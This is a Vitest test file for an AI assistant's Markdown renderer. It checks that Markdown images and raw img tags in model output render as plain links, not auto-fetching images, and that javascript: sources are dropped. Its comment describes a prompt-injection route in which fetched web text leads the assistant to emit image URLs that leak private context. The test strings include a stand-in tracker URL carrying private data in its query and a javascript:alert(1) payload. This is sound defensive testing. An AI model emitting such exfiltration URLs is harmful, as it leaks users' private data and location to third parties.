// @vitest-environment jsdom
import { expect, it } from "vitest";
import { AssistantMarkdown } from "@/components/assistant-markdown";
import { render, screen } from "@/test/dom";

/**
 * Model-authored Markdown must not reach the network on its own.
 *
 * A rendered `<img src>` fetches the moment the response paints - no click, no
 * confirmation - so an image URL in Eve's output is an egress channel: it discloses
 * the reader's IP and reading time, and a URL carrying private context in its path
 * or query exfiltrates that context outright. `web_fetch` puts untrusted third-party
 * prose inside the same turn as private-data tools, so this cannot rest on Eve not
 * emitting one.
 *
 * These tests assert the absence of an element, which is exactly the kind of thing a
 * renderer upgrade silently reintroduces.
 */

/** Every `<img>` the renderer produced, however the Markdown asked for it. */
function images(container: HTMLElement): HTMLImageElement[] {
  return [...container.querySelectorAll("img")];
}

it("renders a Markdown image as a link, never as an <img>", () => {
  const { container } = render(
    <AssistantMarkdown>
      {"Here it is: ![a teapot](https://tracker.example/pixel.png?ctx=mara-divorce)"}
    </AssistantMarkdown>,
  );

  expect(images(container)).toEqual([]);
  const link = screen.getByRole("link", { name: "a teapot" });
  expect(link.getAttribute("href")).toBe("https://tracker.example/pixel.png?ctx=mara-divorce");
  // No referrer, no window handle back: clicking is a deliberate act, and it is the
  // only thing that ever contacts that host.
  expect(link.getAttribute("rel")).toContain("noreferrer");
});

it("closes the raw-HTML route too, which the Markdown syntax shares", () => {
  const { container } = render(
    <AssistantMarkdown>
      {'Look: <img src="https://tracker.example/raw.png" alt="a raw one">'}
    </AssistantMarkdown>,
  );

  expect(images(container)).toEqual([]);
  expect(screen.getByRole("link", { name: "a raw one" })).toBeDefined();
});

it("still names an image that arrived with no alt text", () => {
  const { container } = render(
    <AssistantMarkdown>{"![](https://tracker.example/pixel.png)"}</AssistantMarkdown>,
  );

  expect(images(container)).toEqual([]);
  expect(screen.getByRole("link", { name: "Image" })).toBeDefined();
});

it("refuses to link a source the browser would interpret rather than fetch", () => {
  // Streamdown's own URL sanitizer already drops this one before our override sees
  // it; `safeImageHref` is the second lock, for a scheme it lets through. Either
  // way what matters is the pair of absences.
  const { container } = render(
    <AssistantMarkdown>{"![click me](javascript:alert(1))"}</AssistantMarkdown>,
  );

  expect(images(container)).toEqual([]);
  expect(screen.queryByRole("link")).toBeNull();
});

it("leaves ordinary prose alone", () => {
  const { container } = render(<AssistantMarkdown>{"Mara **adopted** a cat."}</AssistantMarkdown>);

  expect(container.querySelector('[data-streamdown="strong"]')?.textContent).toBe("adopted");
  expect(container.textContent).toBe("Mara adopted a cat.");
});
